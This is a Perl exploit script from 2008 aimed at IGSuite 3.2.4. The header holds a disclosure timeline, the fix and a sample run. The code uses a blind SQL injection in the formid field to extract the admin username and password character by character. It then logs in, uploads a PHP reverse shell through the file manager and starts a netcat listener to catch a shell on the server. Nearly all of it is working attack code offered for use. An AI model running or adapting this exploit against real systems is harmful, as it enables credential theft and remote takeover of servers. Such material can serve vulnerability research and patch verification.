#!/usr/bin/perl
#
# 05/18/2008 - IGSuite 3.2.4 Blind SQL Injection - k`sOSe
# 
# 05/21/2008 -  Vendor notified
# 05/23/2008 -  A patch was pushed via the igsuited daemon(not enabled by default)
# Fix: run igsuited --update-igsuite or upgrade to 3.2.5-beta.
# 
# Tested on IGSuite 3.2.4 on linux with MySQL, needs nc(in path).
# Drops a reverse shell, use http://pentestmonkey.net/tools/php-reverse-shell/
#
#
# cohelet ~ # ./igsploit.pl localhost /cgi-bin / ./php-reverse-shell.php 1234
# IGSploit 0.1 - k`sOSe
#
# [*] Abusing blind SQL injection: ksose=qwerty
# [*] Logging in with username `ksose', password `qwerty'...
# [I] Found `formid' -> 12141384631aX7I
# [I] Logged in!
# [*] Uploading shell..
# [I] Found `formid' -> 1214138463vOl5x
# [*] Requesting //Home/ksose/php-reverse-shell.php now, shell will spawn here...
# listening on [any] 1234 ...
# connect to [127.0.0.1] from localhost [127.0.0.1] 44758
# Linux cohelet 2.6.25-gentoo-r5 #1 SMP PREEMPT Sat Jun 21 11:32:15 CEST 2008 i686 Intel(R) Core(TM)2 CPU 6600 @ 2.40GHz GenuineIntel GNU/Linux
#  14:41:05 up 1 day,  2:52,  1 user,  load average: 0.51, 0.34, 0.52
#  USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
#  root     tty1      Sat11   21:33m  0.84s  0.02s /bin/login --
#  uid=81(apache) gid=81(apache) groups=81(apache)
#  sh: no job control in this shell
#  sh-3.2$

use warnings;
use strict;

print "IGSploit 0.1 - k`sOSe\n\n";
usage() unless(@ARGV>2);


use POSIX;
use LWP::UserAgent;
use HTTP::Cookies;

my $ighost	= $ARGV[0];
my $igcgi	= $ARGV[1];
my $igpath	= $ARGV[2];
my $evilfile	= $ARGV[3];
my $rport	= $ARGV[4];
my $igurl	= 'http://' . $ighost . $igcgi;
my @chars	= ( '', '=', 'a'..'z', 0..9, 'A'..'Z', '-', '_', '@', ';', ':', ',', '.', ')' ,'(', '&', '/', '%', '$' );

my $count	= 1;
my $string	= '';

my $ua = LWP::UserAgent->new;  $ua->agent( "Mozilla/5.0" );
$ua->cookie_jar( HTTP::Cookies->new( ) );
$ua->timeout(5);



print "[*] Abusing blind SQL injection:   ";
$|=1;
while(1)
{
	for my $char( @chars )
	{
		if( defined( my $found = check_char( $count, $char ) ) )
		{
			if( $found eq '' )
			{
				upload_shell( split( '=', $string ) );
				exit;
			}
			$string .= $found;
			$count++;
			last;
		}
	}
}

sub upload_shell
{
	my ($username, $password) = @_;

	print "[*] Logging in with username `$username', password `$password'...\n";
	do_login( $username, $password );


	print "[*] Uploading shell..\n";
	my $formid = get_formid( $ua->get( "$igurl/filemanager?action=uploadfile&dir=/Home/$username&repid=&repapp=&order=nome" )->content );
	my $res = $ua->post(	"$igurl/filemanager",
				Content_Type	=> 'multipart/form-data',
				Content		=> [
						formid		=> [undef, undef, Content => $formid],
						upfile		=> [undef, ($evilfile =~ m/.+\/(.+)/g)[0], Content => slurp($evilfile)],
						newfilename	=> [undef, undef, Content => $evilfile],
						submit8		=> [undef, undef, Content => 'Conferma'],
						]
				);


	if(qx(which nc 2>&1) !~ /^which:/)
	{
		print "[*] Requesting $igpath/Home/$username/" . ($evilfile =~ m/.+\/(.+)/g)[0] . " now, shell will spawn here...\n";

		my $pid = fork();
		if($pid)
		{
			sleep 2;
			my $res = $ua->get ( "http://$ighost$igpath/Home/$username/" . ($evilfile =~ m/.+\/(.+)/g)[0] );

			if(!$res->is_success && $res->status_line() !~ /^500 .*timeout/)
			{
				print "\n[W] Unexpected status code received -> " . $res->status_line . "\n";
			}

			waitpid($pid, 0); 
		}
		else
		{
			exec("`which nc` -v -l -p $rport");
		}
	}
	else
	{
		print "[W] Can't find netcat!\n";
		print "[*] File uploaded on http://$ighost$igpath/Home/$username/" . ($evilfile =~ m/.+\/(.+)/g)[0] . ", start your listener on port $rport and wget it\n";
	}
}

sub do_login
{
	my ($username, $password) = @_;
	
	my $formid = get_formid($ua->get( "$igurl/igsuite" )->content);

	my $res = $ua->post( "$igurl/igsuite", 
				{
					formid	=> $formid,
					login	=> $username,
					pwd	=> $password,
					submit5	=> 'Accedi',
				});
	die( "Can't login\n" )
		if( $res->content !~ /this application need a browser that support multi frame/ );

	# lies
	print "[I] Logged in!\n";

	return $formid;
}

sub get_formid
{
	my ($content) = @_;

	die( "Can't find formid value\n" )
		 unless $content =~ /name="formid"\s+value="(.+?)"/;

	print "[I] Found `formid' -> $1\n";

	return $1;
}

sub slurp
{
	return do { 
			open(my $f, "<$_[0]") or die("opening `$_[0]': $!"); 
			local $/; 
			my $s=<$f>; 
			close $f;  
			$s 
		};
}

sub check_char
{
	my ($count, $char) = @_;

	my $res = $ua->post( "$igurl/igsuite",
				{
					formid =>	"1' OR (SELECT ".
							"MID(CONCAT(`login`, 0x3d, `passwd`), $count, 1) ".
							"FROM `users` LIMIT 0,1) = '$char",	
				});
	die ("Error: " . $res->status_line . "\n") unless ( $res->is_success );

	if($res->content =~ /IGSuite Error/)
	{
		print "\b$char";
		return undef;
	}
	elsif($res->status_line =~ /^(2\d+|3\d+)/)
	{
		print "\b$char  ";
		print "\n" if ($char eq '');
		return $char;
	}
	else
	{
		print "\n[!] " . $res->status_line . ":\n########\n\n" . $res->content . "\n########\n\n";
		die("[!] Failed, check cgi/docroot path.");
	}
}

sub usage
{
	die <<EOM;
Usage: $0 [host] [path to cgis] [path to igsuite docroot] [reverseshell] [reverseport]

Ex: $0 localhost /cgi-bin / ./php-reverse-shell.php 1234

EOM
}

